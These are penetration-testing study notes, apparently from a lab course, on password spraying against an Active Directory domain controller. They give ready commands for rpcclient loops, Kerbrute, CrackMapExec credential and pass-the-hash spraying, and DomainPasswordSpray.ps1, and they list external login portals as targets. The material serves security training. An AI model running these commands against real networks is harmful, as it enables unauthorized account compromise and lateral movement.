# Internal Password Spraying

## 1.Internal Password Spraying - from Linux

## Internal Password Spraying from a Linux Host

* <https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/>

### Using a Bash one-liner for the Attack

```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

> We can also use `Kerbrute` for the same attack

## Using Kerbrute for the Attack

```shell-session
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

> There are multiple other methods for performing password spraying from Linux. Another great option is using `CrackMapExec`.

## CrackMapExec

### **Using CrackMapExec & Filtering Logon Failures**

```shell-session
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

> After getting one (or more!) hits with our password spraying attack, we can then use `CrackMapExec` to validate the credentials quickly against a Domain Controller.

### **Validating the Credentials with CrackMapExec**

```shell-session
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

## Local Administrator Password Reuse

### Local Admin Spraying with CrackMapExec

```shell-session
 sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

> The output above shows that the credentials were valid as a local admin on `3` systems in the `172.16.5.0/23` subnet. We could then move to enumerate each system to see if we can find anything that will help further our access.

***

## 2.Internal Password Spraying - from Windows

* <https://github.com/dafthack/DomainPasswordSpray>

### Using DomainPasswordSpray.ps1

```powershell-session
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

## External Password Spraying

While outside the scope of this module, password spraying is also a common way that attackers use to attempt to gain a foothold on the internet. We have been very successful with this method during penetration tests to gain access to sensitive data through email inboxes or web applications such as externally facing intranet sites. Some common targets include:

* Microsoft 0365
* Outlook Web Exchange
* Exchange Web Access
* Skype for Business
* Lync Server
* Microsoft Remote Desktop Services (RDS) Portals
* Citrix portals using AD authentication
* VDI implementations using AD authentication such as VMware Horizon
* VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
* Custom web applications that use AD authentication
